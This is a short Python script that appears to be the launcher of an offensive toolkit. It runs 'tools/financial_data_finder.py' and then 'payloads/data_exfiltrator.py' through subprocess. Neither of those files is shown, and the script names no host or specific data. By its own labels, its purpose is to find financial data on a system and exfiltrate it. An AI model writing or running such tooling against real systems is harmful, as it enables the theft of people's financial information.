import subprocess
import os

def main():
    # Run the financial data finder
    financial_data_finder_path = os.path.join(os.path.dirname(__file__), "tools", "financial_data_finder.py")
    subprocess.run(["python3", financial_data_finder_path])

    # Run the data exfiltrator
    data_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "data_exfiltrator.py")
    subprocess.run(["python3", data_exfiltrator_path])

if __name__ == "__main__":
    main()
